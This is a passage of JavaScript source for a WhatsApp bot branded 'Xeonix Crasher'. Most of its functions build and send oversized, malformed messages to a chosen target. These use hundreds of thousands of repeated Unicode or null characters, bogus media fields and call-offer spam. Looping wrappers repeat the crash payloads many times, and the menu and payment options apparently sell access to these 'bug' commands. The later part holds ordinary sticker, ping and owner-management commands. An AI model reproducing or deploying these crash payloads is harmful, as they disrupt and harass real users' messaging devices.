                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function livelocnew(isTarget, ptcp = false) {
let BoomText = "My Location, Come Here!!! @1" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BoomText,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BoomText
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "TAMARYUICHI" 
                            }
                        ]
                    }
                }
            }
        }
    }
};

// Generate the WA message based on the content
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject(messageContent), {
    userJid: m.chat, 
    quoted: QuotedGalaxy // Ensure this is defined or passed correctly
});

// Send the generated message
await Ryc.relayMessage(m.chat, etc.message, {
    participant: { jid: m.chat }, 
    messageId: etc.key.id
});
}
//END
//SEND CALL

async function sendOfferCall(isTarget) {
    try {
        await Ryc.offerCall(isTarget);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(isTarget) {
    try {
        await Ryc.offerCall(isTarget, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
//END
//BUTTON MESSAGE ( NOT WORK )
Ryc.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await Ryc.sendPresenceUpdate('composing', jid)
      return Ryc.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   
//END
//THUMBNAIL LINK + QUOTED MESSAGE
const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: ryclol,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const ThumbUrl = "https://files.catbox.moe/h9o4gt.jpg"
const ewek = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://files.catbox.moe/lzx2jk.jpg" },
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Command : ${command}`,
					"orderTitle": "TamaRyuichi",
					"sellerJid": "6285727819741@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "IDR"
				}
			}
		}
		const xXxX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://files.catbox.moe/lzx2jk.jpg" },
					"itemCount": 2009,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `! #Crash Message# !`,
					"orderTitle": " TamaRyuichi",
					"sellerJid": "6285727819741@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "2009",
					"totalCurrencyCode": "IDR"
				}
			}
		}

const ReplyRyc = (teks) => {
    return Ryc.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `Zyrox `,
                body: `Zyrox Always With You`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: "https://files.catbox.moe/lzx2jk.jpg",
                sourceUrl: `https://youtube.com/@Cella`
            }
        }
    }, { quoted: lol });
}

//FUNC BUG
async function Force(isTarget) {
const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "This is Zyrox🥵" + "ꦽ".repeat(45000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: Ryc.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [isTarget],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "PL",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: "This is Zyrox🥵",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/testi_hwuwhw99",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: isTarget,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - "𝗋34" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : devorsixcore",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await Ryc.relayMessage(isTarget, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: isTarget },
  });
}

async function RavageCursorOrder(target) {
const buttons = [
{ buttonId: "\u0000".repeat(549999), buttonText: { displayText: "𝐃𝐚𝐟𝐟𝐚 𝐀𝐥𝐰𝐚𝐲𝐬 𝐒𝐨𝐥𝐨" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }, 
{
buttonId: "\u0000", 
buttonText: { displayText: 'Ravage Crasher' }, 
type: 1, 
nativeFlowInfo: { 
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(102000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3 
}
}
];
 var atc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
orderMessage: {
orderId: "858780903121585",
thumbnail: "",
itemCount: 777,
status: "INQUIRY",
surface: "CATALOG",
message: "📦 𝗥𝗮𝘃𝗮𝗴𝗲 𝗢𝗻𝗹𝘆 𝗢𝗿𝗱𝗲𝗿⃟" + "ꦾ".repeat(99999), 
orderTitle: "", 
sellerJid: "1@s.whatsapp.net",
token: "AR40Ho4Qyc3LSwiWLEdJ9jiBEUzyJxN5FyURQjkwthSOfA==",
totalAmount1000: "98999999999999999",
totalCurrencyCode: "IDR",
messageVersion: 2,
contextInfo: {
virtexId: dafa.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "⏤‌🎭‌‌𝗗𝗮𝗳𝗳𝗮 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿❏",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
caption: "‌‌‌‌ 𝐑‌𝐀‌𝐕‌𝐀‌𝐆‌‌𝐄"
},
hasMediaAttachment: true,
contentText: "Daf tamvan?",
footerText: "𝐊𝐫𝐨𝐜𝐨 𝐌𝐚𝐭𝐢 𝐚𝐣𝐚",
buttons: buttons, 
viewOnce: true,
headerType: 3
}
}
}
}
}
}
}), {});
await Ryc.relayMessage(target, atc.message, { participant: { jid: target}, messageId: atc.key.id });
}


async function StravaX(isTarget) {
      let sections = [];
      for (let i = 0; i < 10000; i++) {
        let largeText = "\u2000".repeat(90000000);
        let deepNested = {
          title: "\u2000".repeat(90000000),
          highlight_label: "\u2000".repeat(90000000),
          rows: [
            {
              title: largeText,
              id: "\u2000".repeat(90000000),
              subrows: [
                {
                  title: "\u2000".repeat(90000000),
                  id: "\u2000".repeat(90000000),
                  subsubrows: [
                    {
                      title: "\u2000".repeat(90000000),
                      id: "\u2000".repeat(90000000),
                    },
                    {
                      title: "\u2000".repeat(90000000),
                      id: "\u2000".repeat(90000000),
                    },
                  ],
                },
                {
                  title: "\u2000".repeat(90000000),
                  id: "\u2000".repeat(90000000),
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "\u2000".repeat(90000000),
        sections: sections,
      };
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: Ryc.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [isTarget],
            },
            body: {
              text: "ダ | 氮 ⏤͟͟͞͞𝗭𝘆𝗿𝗼𝘅𝗠𝗼𝗱𝘀 ͢𝗫𝗲𝗼𝗻𝗶𝘅🕊️🇺🇸" + "ꦾ".repeat(77777), 
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "send_location",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };
    await Ryc.relayMessage(isTarget, message, {
      participant: { jid: isTarget },
    });
   }

//END
async function MahiruCrashh(target) {
    for (let i = 0; i <= 20; i++) {
    await systemUi(target);
    await NativeCore(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await SqlXGlx(target);
    await uibuglogger(target);
    await systemUi(target);
    await systemUi(target);
    await NativeCore(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await SqlXGlx(target);
    await uibuglogger(target);
    await systemUi(target);
    await systemUi(target);
    await NativeCore(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await SqlXGlx(target);
    await uibuglogger(target);
    await systemUi(target);
    await systemUi(target);
    await NativeCore(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await SqlXGlx(target);
    await uibuglogger(target);
    await systemUi(target);
    }
}

async function LangitCrashh(target) {
    for (let i = 0; i <= 20; i++) {
    await systemUi(target);
    await StravaX(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await systemUi(target);
    await systemUi(target);
    await StravaX(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await systemUi(target);
    await systemUi(target);
    await StravaX(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await systemUi(target);
    await systemUi(target);
    await StravaX(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await systemUi(target);
    }
}


//STIKER AND BRAT FUNCTION

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, Ryc, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await Ryc.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Zyrox`,
                    body: `Zyrox Always With You`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://youtube.com/@Cella`
                }
            }
        }, { quoted: lol });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        ReplyRyc('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};

Ryc.ments = async (text) => {
    return [m.sender];
};

//END

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'menu': 
case 'help': {
let Menu = `
─ Information Xeonix Crasher
🎭 Creator  : ZyroxModz
🎭 Script : Xeonix Crasher
🎭 Version : 4.0

  🎭Button Bug
⿻ .hunterattack (in place) 
⿻ .bug-medium (button)
⿻ .+phunter (in place)

𝘛𝘩𝘢𝘯𝘬 𝘛𝘰 
> 𝘈𝘭𝘭𝘢𝘩𝘚𝘸𝘵 ( 𝘔𝘺 𝘎𝘰𝘰𝘥 ) 
> 𝘡𝘺𝘳𝘰𝘹𝘔𝘰𝘥𝘻 ( 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 ) 
> 𝘉𝘦𝘯𝘬𝘻 ( 𝘉𝘦𝘴𝘵 𝘍𝘳𝘪𝘦𝘯𝘥 )` 


const buttons = [
  {
    buttonId: `.creator`, 
    buttonText: { 
      displayText: '👤 Creator' 
    }
  }, {
    buttonId: ".ownermenu", 
    buttonText: {
      displayText: "📄 Owner Menu"
    }
   }, {
   buttonId: ".pay", 
    buttonText: {
      displayText: "🛍️ Payment"
    }
  }
]

const buttonMessage = {
    document: { url: "https://t.me/ZyroxModz" },
    mimetype: "image/png",
    fileName: "𝘡𝘺𝘳𝘰𝘹𝘓𝘺𝘯𝘹𝘪𝘦",
    fileLength: 999999999999999,
    pageCount: 99999,
    caption: Menu,
    footer: '© Zyrox - 2025\n',
    mentions: await Ryc.ments('Aʟʟ Mᴇɴᴜ'),
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: "Xeonix Crasher Version 4", 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "peler",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https://t.me/ZyroxModz", 
       thumbnail: fs.readFileSync('./System/path/menu.png'), 
        thumbnailUrl: "https://files.catbox.moe/lzx2jk.jpg", 
        title: 'Xeonix Crasher',
      },
    },
    viewOnce: true,
    headerType: 6
  };

return await Ryc.sendMessage(m.chat, buttonMessage, { quoted: lol });
/*
Ryc.sendMessage(m.key.remoteJid, {
     image: { url: "https://pomf2.lain.la/f/5l5eayi.jpg" },
     caption: Menu,
     footer: "Ryc - 2025",
     buttons: [ 
         { buttonId: `.tes`,
          buttonText: {
          displayText: 'Status' 
          }, type: 1 },
         { buttonId: `.ewe`,
          buttonText: {
          displayText: '\nGw Penyefong Betton😂'
          }, type: 1 }
     ],
     headerType: 1,
     viewOnce: false
 },{ quoted: lol })
 
Ryc.sendMessage(m.chat, {
        text: Menu,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "Information Tama FleX Agency",
                newsletterJid: `120363321780343299@newsletter`
            },
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: `Ryc ( Riyu )`,
                body: `Finix Bot With Javascript`,
                mediaType: 1,
                thumbnailUrl: "https://files.catbox.moe/n1nqsc.jpg",
                thumbnail: ``,
                sourceUrl: `https://youtube.com/@tamainfinity`
            }
        }
    }, { quoted: lol })
  */
}
break
case 'pay': {
let Next = `
Silahkan Tekan Tombol Di Bawah ini✨`
const buttons = [
  {
    buttonId: `.dana`, 
    buttonText: { 
      displayText: 'DANA🌅' 
    }
  }, {
    buttonId: ".gopay", 
    buttonText: {
      displayText: "GOPAY🌅"
    }
   }, {
   buttonId: ".ovo", 
    buttonText: {
      displayText: "OVO🌅"
    }
  }
]

const buttonMessage = {
    document: { url: "https://t.me/ZyroxModz" },
    mimetype: "image/png",
    fileName: "𝘡𝘺𝘳𝘰𝘹𝘓𝘺𝘯𝘹𝘪𝘦",
    fileLength: 999999999999999,
    pageCount: 99999,
    jpegThumbnail: (await resize (fs.readFileSync('./System/path/menu2.png'), 400, 400)),
    caption: Next,
    footer: '© Zyrox - 2025\n',
    mentions: await Ryc.ments('Aʟʟ Mᴇɴᴜ'),
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: "i will die with you !", 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "peler",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https://t.me/ZyroxModz", 
       thumbnail: fs.readFileSync('./System/path/menu.png'), 
        thumbnailUrl: "https://files.catbox.moe/lzx2jk.jpg", 
        title: 'https://t.me/ZyroxModz',
      },
    },
    viewOnce: true,
    headerType: 6
  };

return await Ryc.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break
// All Case Fitur
case "ownermenu": {
ReplyRyc(`─ 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯 𝘟𝘦𝘰𝘯𝘪𝘹 𝘊𝘳𝘢𝘴𝘩𝘦𝘳
🎭 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 : 𝘡𝘺𝘳𝘰𝘹𝘔𝘰𝘥𝘻
🎭 𝘚𝘤𝘳𝘪𝘱𝘵 : 𝘟𝘦𝘰𝘯𝘪𝘹 𝘊𝘳𝘢𝘴𝘩𝘦𝘳
🎭 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : 4.0

─ 𝘖𝘸𝘯𝘦𝘳 𝘋𝘪𝘴𝘱𝘭𝘢𝘺
⿻ .𝘢𝘥𝘥𝘰𝘸𝘯𝘦𝘳
⿻ .𝘥𝘦𝘭𝘰𝘸𝘯𝘦𝘳
⿻ .𝘢𝘥𝘥𝘱𝘳𝘦𝘮
⿻ .𝘥𝘦𝘭𝘱𝘳𝘦𝘮
⿻ .𝘩𝘪𝘥𝘦𝘵𝘢𝘨
⿻ .𝘬𝘪𝘤𝘬
⿻ .𝘱𝘶𝘣𝘭𝘪𝘤
⿻ .𝘴𝘦𝘭𝘧`)
}
break;
case "dana": {
ReplyRyc(`─ DANA : 08XX`)
}
break;
case "gopay": {
ReplyRyc(`─ GOPAY : 08XX`)
}
break;
case "ovo": {
ReplyRyc(`─ OVO : 08XX`)
}
break;
case "creator": {
ReplyRyc(`─ 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯 𝘊𝘳𝘦𝘢𝘵𝘰𝘳
▢ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳  : 𝘡𝘺𝘳𝘰𝘹𝘔𝘰𝘥𝘻
▢ 𝘚𝘤𝘳𝘪𝘱𝘵 : 𝘟𝘦𝘰𝘯𝘪𝘹 𝘊𝘳𝘢𝘴𝘩𝘦𝘳
▢ 𝘕𝘰 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 : 6289531470531
▢ 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 : 𝘵.𝘮𝘦/𝘡𝘺𝘳𝘰𝘹𝘔𝘰𝘥𝘻
▢ 𝘐𝘯𝘴𝘵𝘢𝘨𝘳𝘢𝘮 : @𝘡𝘺𝘳𝘰𝘹𝘓𝘺𝘯𝘹𝘪𝘦
▢ 𝘠𝘰𝘶𝘵𝘶𝘣𝘦 : -`) 
}
break;
case "restart": {
if (!CreatorOnly) return ReplyRyc(`*Your Not My Owner*`);
ReplyRyc("Restarting Bot...")
setTimeout(() => {
process.send("Restart")
}, 3000)
}
break
case "shutdown": {
if (!CreatorOnly) return ReplyRyc("*Your Not My Owner*")
ReplyRyc(`Shutdown Bot...`)
setTimeout(() => {
process.exit()
}, 3000)
}
break
case 'randomaudio': {
  if (command) {
    // Daftar file audio yang tersedia
    const audioList = [
      './System/Audio/audio1.mp3',
      './System/Audio/audio2.mp3',
      './System/Audio/audio3.mp3',
      './System/Audio/audio4.mp3',
      './System/Audio/audio5.mp3',
      './System/Audio/audio6.mp3'
    ];
    const randomAudio = audioList[Math.floor(Math.random() * audioList.length)];
    Ryc.sendMessage(
      m.chat, 
      { 
        audio: { url: randomAudio }, 
        mimetype: 'audio/mp4', 
        ptt: true
      }, 
      { quoted: lol }
    );
  }
}
break
case 'ping': {
    const old = performance.now()
    const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const serverInfo = `server information

> CPU : *${os.cpus().length} Core, ${os.cpus()[0].model}*
> Uptime : *${Math.floor(os.uptime() / 86400)} days*
> Ram : *${free_ram}/${ram}*
> Speed : *${(performance.now() - old).toFixed(5)} ms*`;
    Ryc.sendMessage(m.chat, {
        text: serverInfo
    },{ quoted: lol })
}
break;

case 'addowner': case 'addown':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await Ryc.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return ReplyRyc(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRyc(`Number ${numero} succes add to database!`);
  break;

case 'delowner': case 'delown':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRyc(`Number ${numero2} succes delate to database!`);
  break;

case 'addpremium': case 'addprem':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await Ryc.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return ReplyRyc(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRyc(`Number ${numero} succes add to database!`);
  break;

case 'delpremium': case 'delprem':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
